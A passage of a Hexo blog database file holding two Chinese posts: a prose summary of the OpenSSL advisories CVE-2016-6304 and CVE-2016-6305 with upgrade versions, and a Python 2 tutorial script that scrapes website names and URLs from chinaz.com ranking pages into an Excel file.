5606835},{"_id":"public/css/style.css","hash":"fffb3966bf36057a325498aba9ce3a2ea7bd79e1","modified":1496365606835},{"_id":"public/fancybox/jquery.fancybox.js","hash":"d08b03a42d5c4ba456ef8ba33116fdbb7a9cabed","modified":1496365606835},{"_id":"public/fancybox/jquery.fancybox.pack.js","hash":"9e0d51ca1dbe66f6c0c7aefd552dc8122e694a6e","modified":1496365606836},{"_id":"public/upload_image/lu33.jpg","hash":"04f7be6b1ba750e9a3aa611ebc02af7e13e466fb","modified":1496365606836},{"_id":"public/upload_image/wjz.jpg","hash":"adc7717fafd00d63d1fee278be8b8504fd4cf8d8","modified":1496365606836},{"_id":"public/css/fonts/fontawesome-webfont.svg","hash":"46fcc0194d75a0ddac0a038aee41b23456784814","modified":1496365606843},{"_id":"public/css/images/banner.jpg","hash":"f44aa591089fcb3ec79770a1e102fd3289a7c6a6","modified":1496365606843},{"_id":"public/upload_image/getweb.jpg","hash":"7205a2a1f80eb11d7aba31ea176c9fb9e845d384","modified":1496365606850}],"Category":[],"Data":[],"Page":[],"Post":[{"title":"OpenSSL(CVE-2016-6304)","date":"2016-09-23T01:30:06.000Z","_content":"## 漏洞发布时间：22-9-2016\n![Alt text](/upload_image/logo.jpg)\n### OCSP状态请求扩展跨内存边界增长(CVE-2016-6304)\n安全等级: 高危\n恶意的客户端可以发送过大的OCSP状态请求延期。如果该客户端不断请求重新谈判，发送一个大的 OCSP 状态请求每延长一次，那么\n就会有无限的内存增长在服务器上。这最终将导致通过内存耗尽的拒绝服务攻击。这种攻击在使用默认配置的服务器上很容易执行，\n即使他们不支持 OCSP。建立使用\"无 ocsp\"生成时间选项不会受到影响。\n\nServers using OpenSSL versions prior to 1.0.1g are not vulnerable in a default configuration, instead only if an application explicitly enables OCSP stapling support.\n\nOpenSSL 1.1.0 应该升级到 1.1.0a \nOpenSSL 1.0.2 应该升级到 1.0.2i \nOpenSSL 1.0.1 应该升级到 1.0.1u\n\n### SSL_peek() hang on empty record (CVE-2016-6305) \n===============================================\nSeverity: Moderate\nOpenSSL 1.1.0 SSL/TLS will hang during a call to SSL_peek() if the peer sends an \nempty record. This could be exploited by a malicious peer in a Denial Of Service \nattack.\nOpenSSL 1.1.0 users should upgrade to 1.1.0a\nThis issue was reported to OpenSSL on 10th September 2016 by Alex Gaynor. The \nfix was developed by Matt Caswell of the OpenSSL development team.\n\n## 摘录：\nmore info[click1](http://toutiao.secjia.com/openssl-security-advisory-cve-2016-6304?from=groupmessage&isappinstalled=0)\nmore info[click2](http://bobao.360.cn/news/detail/3582.html)\nmore info[click3](http://security.360.cn/cve/CVE-2016-6304/)","source":"_posts/OpenSSL-CVE-2016-6304.md","raw":"---\ntitle: OpenSSL(CVE-2016-6304)\ndate: 2016-09-23 09:30:06\ntags:\n---\n## 漏洞发布时间：22-9-2016\n![Alt text](/upload_image/logo.jpg)\n### OCSP状态请求扩展跨内存边界增长(CVE-2016-6304)\n安全等级: 高危\n恶意的客户端可以发送过大的OCSP状态请求延期。如果该客户端不断请求重新谈判，发送一个大的 OCSP 状态请求每延长一次，那么\n就会有无限的内存增长在服务器上。这最终将导致通过内存耗尽的拒绝服务攻击。这种攻击在使用默认配置的服务器上很容易执行，\n即使他们不支持 OCSP。建立使用\"无 ocsp\"生成时间选项不会受到影响。\n\nServers using OpenSSL versions prior to 1.0.1g are not vulnerable in a default configuration, instead only if an application explicitly enables OCSP stapling support.\n\nOpenSSL 1.1.0 应该升级到 1.1.0a \nOpenSSL 1.0.2 应该升级到 1.0.2i \nOpenSSL 1.0.1 应该升级到 1.0.1u\n\n### SSL_peek() hang on empty record (CVE-2016-6305) \n===============================================\nSeverity: Moderate\nOpenSSL 1.1.0 SSL/TLS will hang during a call to SSL_peek() if the peer sends an \nempty record. This could be exploited by a malicious peer in a Denial Of Service \nattack.\nOpenSSL 1.1.0 users should upgrade to 1.1.0a\nThis issue was reported to OpenSSL on 10th September 2016 by Alex Gaynor. The \nfix was developed by Matt Caswell of the OpenSSL development team.\n\n## 摘录：\nmore info[click1](http://toutiao.secjia.com/openssl-security-advisory-cve-2016-6304?from=groupmessage&isappinstalled=0)\nmore info[click2](http://bobao.360.cn/news/detail/3582.html)\nmore info[click3](http://security.360.cn/cve/CVE-2016-6304/)","slug":"OpenSSL-CVE-2016-6304","published":1,"updated":"2017-06-02T01:04:49.903Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj3f5g10i0000joo5ccpmt4hi","content":"<h2 id=\"漏洞发布时间：22-9-2016\"><a href=\"#漏洞发布时间：22-9-2016\" class=\"headerlink\" title=\"漏洞发布时间：22-9-2016\"></a>漏洞发布时间：22-9-2016</h2><p><img src=\"/upload_image/logo.jpg\" alt=\"Alt text\"></p>\n<h3 id=\"OCSP状态请求扩展跨内存边界增长-CVE-2016-6304\"><a href=\"#OCSP状态请求扩展跨内存边界增长-CVE-2016-6304\" class=\"headerlink\" title=\"OCSP状态请求扩展跨内存边界增长(CVE-2016-6304)\"></a>OCSP状态请求扩展跨内存边界增长(CVE-2016-6304)</h3><p>安全等级: 高危<br>恶意的客户端可以发送过大的OCSP状态请求延期。如果该客户端不断请求重新谈判，发送一个大的 OCSP 状态请求每延长一次，那么<br>就会有无限的内存增长在服务器上。这最终将导致通过内存耗尽的拒绝服务攻击。这种攻击在使用默认配置的服务器上很容易执行，<br>即使他们不支持 OCSP。建立使用”无 ocsp”生成时间选项不会受到影响。</p>\n<p>Servers using OpenSSL versions prior to 1.0.1g are not vulnerable in a default configuration, instead only if an application explicitly enables OCSP stapling support.</p>\n<p>OpenSSL 1.1.0 应该升级到 1.1.0a<br>OpenSSL 1.0.2 应该升级到 1.0.2i<br>OpenSSL 1.0.1 应该升级到 1.0.1u</p>\n<h3 id=\"SSL-peek-hang-on-empty-record-CVE-2016-6305\"><a href=\"#SSL-peek-hang-on-empty-record-CVE-2016-6305\" class=\"headerlink\" title=\"SSL_peek() hang on empty record (CVE-2016-6305)\"></a>SSL_peek() hang on empty record (CVE-2016-6305)</h3><p>===============================================<br>Severity: Moderate<br>OpenSSL 1.1.0 SSL/TLS will hang during a call to SSL_peek() if the peer sends an<br>empty record. This could be exploited by a malicious peer in a Denial Of Service<br>attack.<br>OpenSSL 1.1.0 users should upgrade to 1.1.0a<br>This issue was reported to OpenSSL on 10th September 2016 by Alex Gaynor. The<br>fix was developed by Matt Caswell of the OpenSSL development team.</p>\n<h2 id=\"摘录：\"><a href=\"#摘录：\" class=\"headerlink\" title=\"摘录：\"></a>摘录：</h2><p>more info<a href=\"http://toutiao.secjia.com/openssl-security-advisory-cve-2016-6304?from=groupmessage&amp;isappinstalled=0\" target=\"_blank\" rel=\"external\">click1</a><br>more info<a href=\"http://bobao.360.cn/news/detail/3582.html\" target=\"_blank\" rel=\"external\">click2</a><br>more info<a href=\"http://security.360.cn/cve/CVE-2016-6304/\" target=\"_blank\" rel=\"external\">click3</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"漏洞发布时间：22-9-2016\"><a href=\"#漏洞发布时间：22-9-2016\" class=\"headerlink\" title=\"漏洞发布时间：22-9-2016\"></a>漏洞发布时间：22-9-2016</h2><p><img src=\"/upload_image/logo.jpg\" alt=\"Alt text\"></p>\n<h3 id=\"OCSP状态请求扩展跨内存边界增长-CVE-2016-6304\"><a href=\"#OCSP状态请求扩展跨内存边界增长-CVE-2016-6304\" class=\"headerlink\" title=\"OCSP状态请求扩展跨内存边界增长(CVE-2016-6304)\"></a>OCSP状态请求扩展跨内存边界增长(CVE-2016-6304)</h3><p>安全等级: 高危<br>恶意的客户端可以发送过大的OCSP状态请求延期。如果该客户端不断请求重新谈判，发送一个大的 OCSP 状态请求每延长一次，那么<br>就会有无限的内存增长在服务器上。这最终将导致通过内存耗尽的拒绝服务攻击。这种攻击在使用默认配置的服务器上很容易执行，<br>即使他们不支持 OCSP。建立使用”无 ocsp”生成时间选项不会受到影响。</p>\n<p>Servers using OpenSSL versions prior to 1.0.1g are not vulnerable in a default configuration, instead only if an application explicitly enables OCSP stapling support.</p>\n<p>OpenSSL 1.1.0 应该升级到 1.1.0a<br>OpenSSL 1.0.2 应该升级到 1.0.2i<br>OpenSSL 1.0.1 应该升级到 1.0.1u</p>\n<h3 id=\"SSL-peek-hang-on-empty-record-CVE-2016-6305\"><a href=\"#SSL-peek-hang-on-empty-record-CVE-2016-6305\" class=\"headerlink\" title=\"SSL_peek() hang on empty record (CVE-2016-6305)\"></a>SSL_peek() hang on empty record (CVE-2016-6305)</h3><p>===============================================<br>Severity: Moderate<br>OpenSSL 1.1.0 SSL/TLS will hang during a call to SSL_peek() if the peer sends an<br>empty record. This could be exploited by a malicious peer in a Denial Of Service<br>attack.<br>OpenSSL 1.1.0 users should upgrade to 1.1.0a<br>This issue was reported to OpenSSL on 10th September 2016 by Alex Gaynor. The<br>fix was developed by Matt Caswell of the OpenSSL development team.</p>\n<h2 id=\"摘录：\"><a href=\"#摘录：\" class=\"headerlink\" title=\"摘录：\"></a>摘录：</h2><p>more info<a href=\"http://toutiao.secjia.com/openssl-security-advisory-cve-2016-6304?from=groupmessage&amp;isappinstalled=0\" target=\"_blank\" rel=\"external\">click1</a><br>more info<a href=\"http://bobao.360.cn/news/detail/3582.html\" target=\"_blank\" rel=\"external\">click2</a><br>more info<a href=\"http://security.360.cn/cve/CVE-2016-6304/\" target=\"_blank\" rel=\"external\">click3</a></p>\n"},{"title":"GetWebContent","date":"2016-11-21T06:19:19.000Z","_content":"代码的作用是抓取页面“http://top.chinaz.com/diqu/index_ZheJiang_2.html-100.html”页面中列出来的浙江网站的名称+url；\n但是过程中遇见了几个难点：正则匹配、url的分解重组、异常处理以及最后保存到excel中内容被覆盖的问题等。\n1. 在使用正则的过程中，难点是正则规则的写法。比如：怎么使用\"非贪婪\"模式，怎么进行循环遍历。\n2. 在url重组的时候，要使用type()查看类型，保证+号前后都是字符串，或整型。\n3. 异常处理语句：(try------except语句)。\n4. excel保存内容，先把获取到的数据保存到列表当中，最后把整个列表一次性保存到excel中，这样就可以保证内容不被覆盖。\n![Alt text](\\upload_image\\getweb2.jpg)\n## 代码块：\n### python--re模块\n\t这个模块提供了与 Perl 相似l的正则表达式匹配操作。Unicode字符串也同样适用\n\t正则表达式使用反斜杠\" \\ \"来代表特殊形式或用作转义字符，这里跟Python的语法冲突，因此，Python用\" \\\\\\\\ \"表示正则表达式中的\" \\ \"，因为正则表达式中如果要匹配\" \\ \"，需要用\\来转义，变成\" \\\\ \"，而Python语法中又需要对字符串中每一个\\进行转义，所以就变成了\" \\\\\\\\ \"\t\n\t为了使正则表达式具有更好的可读性，Python特别设计了原始字符串(raw string)，需要提醒你的是，在写文件路径的时候就不要使用raw string了，这里存在陷阱。raw string就是用'r'作为字符串的前缀，如 r\"\\n\"：表示两个字符\"\\\"和\"n\"，而不是换行符了。Python中写正则表达式时推荐使用这种形式\n\t绝大多数正则表达式操作与模块级函数或RegexObject方法一样都能达到同样的目的。而且不需要你一开始就编译正则表达式对象，但是不能使用一些实用的微调参数\nmore info: [re模块简介](http://www.cnblogs.com/PythonHome/archive/2011/11/19/2255459.html)\n\n### python--xlwt/xlrd\npython中的xlwt是创建一个excel，写入新的内容。\npython中的xlrd是修改已存在的excel中的内容。\nmore info: [xlwt/xlrd简介](http://www.cnblogs.com/MrLJC/p/3715783.html)\n\n\n![Alt text](\\upload_image\\getweb.jpg)\n``` bash\n#coding=utf-8\n\nimport urllib2\nimport re\nimport xlwt\n\nnum = 2\nworkbook=xlwt.Workbook()\t\t#创建一个workbook对象\nsheet1=workbook.add_sheet('sheet1',cell_overwrite_ok=True)\t#创建一个sheet对象\nname_list=[]\nurl_list=[]\nwhile(num<=100):\n\tuserMainUrl = \"http://top.chinaz.com/diqu/index_ZheJiang_\" + str(num) + \".html\"\t\t#对url进行拆分，进行循环\n\treq = urllib2.Request(userMainUrl)\n\tresp = urllib2.urlopen(req)\n\trespHtml = resp.read()\t\t\t#把网页源代码提取出来赋值给respHtml\n\tnum = num+1\n\t#print \"respHtml=\", respHtml     \n\n\t#class=\"pr10 fz14\">三国杀官方网站</a>    需要匹配的名字\n\t#</a><span class=\"col-gray\">sanguosha.com</span>   需要匹配的url\n\tUrl = '</a><span\\s+?class=\"col-gray\">(?P<gray>.+?)</span>'\n\tName = '\\s+?class=\"pr10 fz14\">(?P<pr10>.+?)</a>'\t#正则表达式，表示匹配的规则\"\\s+?、(?P<>.+?)\"\n\tdef find(value):\n\t\tcomp1 = re.compile(value)\t\t\t #将正则表达式编译，提高运行速度。\n\t\tfoundNm = comp1.findall(respHtml)\t#表示在respHtml中进行匹配\n\t\treturn foundNm         #findall会返回一个列表，列表中的对象是字符串或乱码。\n\t\t# for message in foundNm:\t\t\t\t#用for循环把列表的内容读取出来\n\t\t\t# print message.decode('utf-8')    #.decode('utf-8')\n\n\tlsn = find(Name)\n\tlsu = find(Url)\n\n\tname_list+=lsn\t\t\t#先把获取到的数据保存到列表当中，最后把整个列表一次性保存到excel中\n\turl_list+=lsu\n\ncount=len(name_list)\ni=0\nwhile(i < count):\n\tn=name_list[i]\n\tu=url_list[i]\n\ti+=1\n\ttry:\n\t\tprint n.decode(\"utf-8\"), u\n\texcept UnicodeEncodeError:\t\t\t#try...except语句抓取报错，避免出现一个错误导致后面的都不执行了。\n\t\tprint n, u\n\tsheet1.write(i,0,n.decode(\"utf-8\"))\n\tsheet1.write(i,1,u)\nelse:\n\tprint 'loading......'\n\nworkbook.save('xxx.xls')\n\nprint 'all the pages were done!!!'\n```\n\n### sign: bman","source":"_posts/getwebcontent.md","raw":"---\ntitle: GetWebContent\ndate: 2016-11-21 14:19:19\ntags:\n---\n代码的作用是抓取页面“http://top.chinaz.com/diqu/index_ZheJiang_2.html-100.html”页面中列出来的浙江网站的名称+url；\n但是过程中遇见了几个难点：正则匹配、url的分解重组、异常处理以及最后保存到excel中内容被覆盖的问题等。\n1. 在使用正则的过程中，难点是正则规则的写法。比如：怎么使用\"非贪婪\"模式，怎么进行循环遍历。\n2. 在url重组的时候，要使用type()查看类型，保证+号前后都是字符串，或整型。\n3. 异常处理语句：(try------except语句)。\n4. excel保存内容，先把获取到的数据保存到列表当中，最后把整个列表一次性保存到excel中，这样就可以保证内容不被覆盖。\n![Alt text](\\upload_image\\getweb2.jpg)\n## 代码块：\n### python--re模块\n\t这个模块提供了与 Perl 相似l的正则表达式匹配操作。Unicode字符串也同样适用\n\t正则表达式使用反斜杠\" \\ \"来代表特殊形式或用作转义字符，这里跟Python的语法冲突，因此，Python用\" \\\\\\\\ \"表示正则表达式中的\" \\ \"，因为正则表达式中如果要匹配\" \\ \"，需要用\\来转义，变成\" \\\\ \"，而Python语法中又需要对字符串中每一个\\进行转义，所以就变成了\" \\\\\\\\ \"\t\n\t为了使正则表达式具有更好的可读性，Python特别设计了原始字符串(raw string)，需要提醒你的是，在写文件路径的时候就不要使用raw string了，这里存在陷阱。raw string就是用'r'作为字符串的前缀，如 r\"\\n\"：表示两个字符\"\\\"和\"n\"，而不是换行符了。Python中写正则表达式时推荐使用这种形式\n\t绝大多数正则表达式操作与模块级函数或RegexObject方法一样都能达到同样的目的。而且不需要你一开始就编译正则表达式对象，但是不能使用一些实用的微调参数\nmore info: [re模块简介](http://www.cnblogs.com/PythonHome/archive/2011/11/19/2255459.html)\n\n### python--xlwt/xlrd\npython中的xlwt是创建一个excel，写入新的内容。\npython中的xlrd是修改已存在的excel中的内容。\nmore info: [xlwt/xlrd简介](http://www.cnblogs.com/MrLJC/p/3715783.html)\n\n\n![Alt text](\\upload_image\\getweb.jpg)\n``` bash\n#coding=utf-8\n\nimport urllib2\nimport re\nimport xlwt\n\nnum = 2\nworkbook=xlwt.Workbook()\t\t#创建一个workbook对象\nsheet1=workbook.add_sheet('sheet1',cell_overwrite_ok=True)\t#创建一个sheet对象\nname_list=[]\nurl_list=[]\nwhile(num<=100):\n\tuserMainUrl = \"http://top.chinaz.com/diqu/index_ZheJiang_\" + str(num) + \".html\"\t\t#对url进行拆分，进行循环\n\treq = urllib2.Request(userMainUrl)\n\tresp = urllib2.urlopen(req)\n\trespHtml = resp.read()\t\t\t#把网页源代码提取出来赋值给respHtml\n\tnum = num+1\n\t#print \"respHtml=\", respHtml     \n\n\t#class=\"pr10 fz14\">三国杀官方网站</a>    需要匹配的名字\n\t#</a><span class=\"col-gray\">sanguosha.com</span>   需要匹配的url\n\tUrl = '</a><span\\s+?class=\"col-gray\">(?P<gray>.+?)</span>'\n\tName = '\\s+?class=\"pr10 fz14\">(?P<pr10>.+?)</a>'\t#正则表达式，表示匹配的规则\"\\s+?、(?P<>.+?)\"\n\tdef find(value):\n\t\tcomp1 = re.compile(value)\t\t\t #将正则表达式编译，提高运行速度。\n\t\tfoundNm = comp1.findall(respHtml)\t#表示在respHtml中进行匹配\n\t\treturn foundNm         #findall会返回一个列表，列表中的对象是字符串或乱码。\n\t\t# for message in foundNm:\t\t\t\t#用for循环把列表的内容读取出来\n\t\t\t# print message.decode('utf-8')    #.decode('utf-8')\n\n\tlsn = find(Name)\n\tlsu = find(Url)\n\n\tname_list+=lsn\t\t\t#先把获取到的数据保存到列表当中，最后把整个列表一次性保存到excel中\n\turl_list+=lsu\n\ncount=len(name_list)\ni=0\nwhile(i < count):\n\tn=name_list[i]\n\tu=url_list[i]\n\ti+=1\n\ttry:\n\t\tprint n.decode(\"utf-8\"), u\n\texcept UnicodeEncodeError:\t\t\t#try...except语句抓取报错，避免出现一个错误导致后面的都不执行了。\n\t\tprint n, u\n\tsheet1.write(i,0,n.decode(\"utf-8\"))\n\tsheet1.write(i,1,u)\nelse:\n\tprint 'loading......'\n\nworkbook.save('xxx.xls')\n\nprint 'all the pages were done!!!'\n```\n\n### sign: bman","slug":"getwebcontent","published":1,"updated":"2017-05-31T07:58:06.616Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj3f5g10y0001joo5gubwa0fn","content":"<p>代码的作用是抓取页面“<a href=\"http://top.chinaz.com/diqu/index_ZheJiang_2.html-100.html”页面中列出来的浙江网站的名称+url；\" target=\"_blank\" rel=\"external\">http://top.chinaz.com/diqu/index_ZheJiang_2.html-100.html”页面中列出来的浙江网站的名称+url；</a><br>但是过程中遇见了几个难点：正则匹配、url的分解重组、异常处理以及最后保存到excel中内容被覆盖的问题等。</p>\n<ol>\n<li>在使用正则的过程中，难点是正则规则的写法。比如：怎么使用”非贪婪”模式，怎么进行循环遍历。</li>\n<li>在url重组的时候，要使用type()查看类型，保证+号前后都是字符串，或整型。</li>\n<li>异常处理语句：(try——except语句)。</li>\n<li>excel保存内容，先把获取到的数据保存到列表当中，最后把整个列表一次性保存到excel中，这样就可以保证内容不被覆盖。<br><img src=\"\\upload_image\\getweb2.jpg\" alt=\"Alt text\"><h2 id=\"代码块：\"><a href=\"#代码块：\" class=\"headerlink\" title=\"代码块：\"></a>代码块：</h2><h3 id=\"python–re模块\"><a href=\"#python–re模块\" class=\"headerlink\" title=\"python–re模块\"></a>python–re模块</h3> 这个模块提供了与 Perl 相似l的正则表达式匹配操作。Unicode字符串也同样适用<br> 正则表达式使用反斜杠” \\ “来代表特殊形式或用作转义字符，这里跟Python的语法冲突，因此，Python用” \\\\ “表示正则表达式中的” \\ “，因为正则表达式中如果要匹配” \\ “，需要用\\来转义，变成” \\ “，而Python语法中又需要对字符串中每一个\\进行转义，所以就变成了” \\\\ “<br> 为了使正则表达式具有更好的可读性，Python特别设计了原始字符串(raw string)，需要提醒你的是，在写文件路径的时候就不要使用raw string了，这里存在陷阱。raw string就是用’r’作为字符串的前缀，如 r”\\n”：表示两个字符”\\”和”n”，而不是换行符了。Python中写正则表达式时推荐使用这种形式<br> 绝大多数正则表达式操作与模块级函数或RegexObject方法一样都能达到同样的目的。而且不需要你一开始就编译正则表达式对象，但是不能使用一些实用的微调参数<br>more info: <a href=\"http://www.cnblogs.com/PythonHome/archive/2011/11/19/2255459.html\" target=\"_blank\" rel=\"external\">re模块简介</a></li>\n</ol>\n<h3 id=\"python–xlwt-xlrd\"><a href=\"#python–xlwt-xlrd\" class=\"headerlink\" title=\"python–xlwt/xlrd\"></a>python–xlwt/xlrd</h3><p>python中的xlwt是创建一个excel，写入新的内容。<br>python中的xlrd是修改已存在的excel中的内容。<br>more info: <a href=\"http://www.cnblogs.com/MrLJC/p/3715783.html\" target=\"_blank\" rel=\"external\">xlwt/xlrd简介</a></p>\n<p><img src=\"\\upload_image\\getweb.jpg\" alt=\"Alt text\"><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#coding=utf-8</span></div><div class=\"line\"></div><div class=\"line\">import urllib2</div><div class=\"line\">import re</div><div class=\"line\">import xlwt</div><div class=\"line\"></div><div class=\"line\">num = 2</div><div class=\"line\">workbook=xlwt.Workbook()\t\t<span class=\"comment\">#创建一个workbook对象</span></div><div class=\"line\">sheet1=workbook.add_sheet(<span class=\"string\">'sheet1'</span>,cell_overwrite_ok=True)\t<span class=\"comment\">#创建一个sheet对象</span></div><div class=\"line\">name_list=[]</div><div class=\"line\">url_list=[]</div><div class=\"line\"><span class=\"keyword\">while</span>(num&lt;=100):</div><div class=\"line\">\tuserMainUrl = <span class=\"string\">\"http://top.chinaz.com/diqu/index_ZheJiang_\"</span> + str(num) + <span class=\"string\">\".html\"</span>\t\t<span class=\"comment\">#对url进行拆分，进行循环</span></div><div class=\"line\">\treq = urllib2.Request(userMainUrl)</div><div class=\"line\">\tresp = urllib2.urlopen(req)</div><div class=\"line\">\trespHtml = resp.read()\t\t\t<span class=\"comment\">#把网页源代码提取出来赋值给respHtml</span></div><div class=\"line\">\tnum = num+1</div><div class=\"line\">\t<span class=\"comment\">#print \"respHtml=\", respHtml     </span></div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\">#class=\"pr10 fz14\"&gt;三国杀官方网站&lt;/a&gt;    需要匹配的名字</span></div><div class=\"line\">\t<span class=\"comment\">#&lt;/a&gt;&lt;span class=\"col-gray\"&gt;sanguosha.com&lt;/span&gt;   需要匹配的url</span></div><div class=\"line\">\tUrl = <span class=\"string\">'&lt;/a&gt;&lt;span\\s+?class=\"col-gray\"&gt;(?P&lt;gray&gt;.+?)&lt;/span&gt;'</span></div><div class=\"line\">\tName = <span class=\"string\">'\\s+?class=\"pr10 fz14\"&gt;(?P&lt;pr10&gt;.+?)&lt;/a&gt;'</span>\t<span class=\"comment\">#正则表达式，表示匹配的规则\"\\s+?、(?P&lt;&gt;.+?)\"</span></div><div class=\"line\">\tdef find(value):</div><div class=\"line\">\t\tcomp1 = re.compile(value)\t\t\t <span class=\"comment\">#将正则表达式编译，提高运行速度。</span></div><div class=\"line\">\t\tfoundNm = comp1.findall(respHtml)\t<span class=\"comment\">#表示在respHtml中进行匹配</span></div><div class=\"line\">\t\t<span class=\"built_in\">return</span> foundNm         <span class=\"comment\">#findall会返回一个列表，列表中的对象是字符串或乱码。</span></div><div class=\"line\">\t\t<span class=\"comment\"># for message in foundNm:\t\t\t\t#用for循环把列表的内容读取出来</span></div><div class=\"line\">\t\t\t<span class=\"comment\"># print message.decode('utf-8')    #.decode('utf-8')</span></div><div class=\"line\"></div><div class=\"line\">\tlsn = find(Name)</div><div class=\"line\">\tlsu = find(Url)</div><div class=\"line\"></div><div class=\"line\">\tname_list+=lsn\t\t\t<span class=\"comment\">#先把获取到的数据保存到列表当中，最后把整个列表一次性保存到excel中</span></div><div class=\"line\">\turl_list+=lsu</div><div class=\"line\"></div><div class=\"line\">count=len(name_list)</div><div class=\"line\">i=0</div><div class=\"line\"><span class=\"keyword\">while</span>(i &lt; count):</div><div class=\"line\">\tn=name_list[i]</div><div class=\"line\">\tu=url_list[i]</div><div class=\"line\">\ti+=1</div><div class=\"line\">\ttry:</div><div class=\"line\">\t\t<span class=\"built_in\">print</span> n.decode(<span class=\"string\">\"utf-8\"</span>), u</div><div class=\"line\">\texcept UnicodeEncodeError:\t\t\t<span class=\"comment\">#try...except语句抓取报错，避免出现一个错误导致后面的都不执行了。</span></div><div class=\"line\">\t\t<span class=\"built_in\">print</span> n, u</div><div class=\"line\">\tsheet1.write(i,0,n.decode(<span class=\"string\">\"utf-8\"</span>))</div><div class=\"line\">\tsheet1.write(i,1,u)</div><div class=\"line\"><span class=\"keyword\">else</span>:</div><div class=\"line\">\t<span class=\"built_in\">print</span> <span class=\"string\">'loading......'</span></div><div class=\"line\"></div><div class=\"line\">workbook.save(<span class=\"string\">'xxx.xls'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"built_in\">print</span> <span class=\"string\">'all the pages were done!!!'</span></div></pre></td></tr></table></figure></p>\n<h3 id=\"sign-bman\"><a href=\"#sign-bman\" class=\"headerlink\" title=\"sign: bman\"></a>sign: bman</h3>","site":{"data":{}},"excerpt":"","more":"<p>代码的作用是抓取页面“<a href=\"http://top.chinaz.com/diqu/index_ZheJiang_2.html-100.html”页面中列出来的浙江网站的名称+url；\" target=\"_blank\" rel=\"external\">http://top.chinaz.com/diqu/index_ZheJiang_2.html-100.html”页面中列出来的浙江网站的名称+url；</a><br>但是过程中遇见了几个难点：正则匹配、url的分解重组、异常处理以及最后保存到excel中内容被覆盖的问题等。</p>\n<ol>\n<li>在使用正则的过程中，难点是正则规则的写法。比如：怎么使用”非贪婪”模式，怎么进行循环遍历。</li>\n<li>在url重组的时候，要使用type()查看类型，保证+号前后都是字符串，或整型。</li>\n<li>异常处理语句：(try——except语句)。</li>\n<li>excel保存内容，先把获取到的数据保存到列表当中，最后把整个列表一次性保存到excel中，这样就可以保证内容不被覆盖。<br><img src=\"\\upload_image\\getweb2.jpg\" alt=\"Alt text\"><h2 id=\"代码块：\"><a href=\"#代码块：\" class=\"headerlink\" title=\"代码块：\"></a>代码块：</h2><h3 id=\"python–re模块\"><a href=\"#python–re模块\" class=\"headerlink\" title=\"python–re模块\"></a>python–re模块</h3> 这个模块提供了与 Perl 相似l的正则表达式匹配操作。Unicode字符串也同样适用<br> 正则表达式使用反斜杠” \\ “来代表特殊形式或用作转义字符，这里跟Python的语法冲突，因此，Python用” \\\\ “表示正则表达式中的” \\ “，因为正则表达式中如果要匹配” \\ “，需要用\\来转义，变成” \\ “，而Python语法中又需要对字符串中每一个\\进行转义，所以就变成了” \\\\ “<br> 为了使正则表达式具有更好的可读性，Python特别设计了原始字符串(raw string)，需要提醒你的是，在写文件路径的时候就不要使用raw string了，这里存在陷阱。raw string就是用’r’作为字符串的前缀，如 r”\\n”：表示两个字符”\\”和”n”，而不是换行符了。Python中写正则表达式时推荐使用这种形式<br> 绝大多数正则表达式操作与模块级函数或RegexObject方法一样都能达到同样的目的。而且不需要你一开始就编译正则表达式对象，但是不能使用一些实用的微调参数<br>more info: <a href=\"http://www.cnblogs.com/PythonHome/archive/2011/11/19/2255459.html\" target=\"_blank\" rel=\"external\">re模块简介</a></li>\n</ol>\n<h3 id=\"python–xlwt-xlrd\"><a href=\"#python–xlwt-xlrd\" class=\"headerlink\" title=\"python–xlwt/xlrd\"></a>python–xlwt/xlrd</h3><p>python中的xlwt是创建一个excel，写入新的内容。<br>python中的xlrd是修改已存在的excel中的内容。<br>more info: <a href=\"http://www.cnblogs.com/MrLJC/p/3715783.html\" target=\"_blank\" rel=\"external\">xlwt/xlrd简介</a></p>\n<p><img src=\"\\upload_image\\getweb.jpg\" alt=\"Alt text\"><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div 